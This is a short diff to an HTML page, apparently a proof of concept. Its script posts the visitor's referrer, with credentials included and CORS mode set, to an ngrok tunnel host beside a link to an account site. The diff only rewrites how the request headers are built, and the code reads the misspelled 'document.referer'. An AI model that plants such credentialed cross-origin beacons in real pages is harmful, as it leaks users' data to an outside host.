@@ -5,11 +5,13 @@
 <body>
 <a href="https://myaccount.elic.ro">aaa</a>
 <script>
+var myHeaders = new Headers();
+myHeaders.append('Content-Type', 'application/json');
 fetch("https://2fecdb12.ngrok.io/common/referer/", {
 	method : "post",
 	credentials: 'include',
 	mode: 'cors',
-	headers: { "Content-Type": "application/json" },
+	headers: myHeaders,
 	body: JSON.stringify({
 		referer : document.referer
 	})
